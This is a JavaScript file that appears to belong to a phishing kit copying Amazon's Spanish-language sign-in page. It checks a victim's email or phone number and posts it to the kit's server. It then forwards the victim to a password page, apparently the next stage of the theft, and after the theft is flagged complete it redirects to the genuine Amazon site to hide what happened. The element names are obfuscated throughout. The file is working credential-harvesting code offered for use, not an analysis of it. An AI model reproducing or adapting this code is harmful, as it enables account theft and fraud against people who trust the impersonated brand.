if (localStorage.getItem("complete")) {
  window.location.replace("https://www.amazon.com/-/es/");
}

window.addEventListener("pageshow", function (event) {
  if (event.persisted) {
    window.location.reload();
  }
});

const form = document.getElementById("NUEoRPbD");
const emailInput = document.getElementById("IQSYhG5C");
const errorAlert = document.getElementById("EvIkydj0");

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function scrollToTop() {
  window.scrollTo({ top: 0, left: 0, behavior: "smooth" });
}

emailInput.addEventListener("input", () => {
  emailInput.classList.remove("RBBTMeMo");
  errorAlert.style.display = "none";
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();

  if (!email) {
    emailInput.classList.add("RBBTMeMo");
    errorAlert.innerHTML = `
      <div class="cYIDEVUr"></div>
      <div>Enter your mobile number or email</div>
    `;
    errorAlert.style.display = "flex";
    emailInput.focus();
    scrollToTop();
    return;
  }

  const isPhone = /^[0-9+\s()-]{6,}$/.test(email);
  if (!isPhone && !emailRegex.test(email)) {
    emailInput.classList.add("RBBTMeMo");
    errorAlert.innerHTML = `
      <div class="cYIDEVUr"></div>
      <div>Invalid email address </div>
    `;
    errorAlert.style.display = "flex";
    emailInput.focus();
    scrollToTop();
    return;
  }

  try {
    const res = await fetch("/users/init", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email }),
    });

    if (!res.ok) {
      alert("Hubo un problema al procesar tu solicitud.");
      return;
    }

    const params = new URLSearchParams();
    params.set("email", email);
    window.location.href = `password.html?${params.toString()}`;
  } catch {
    alert("Error de conexión con el servidor.");
  }
});
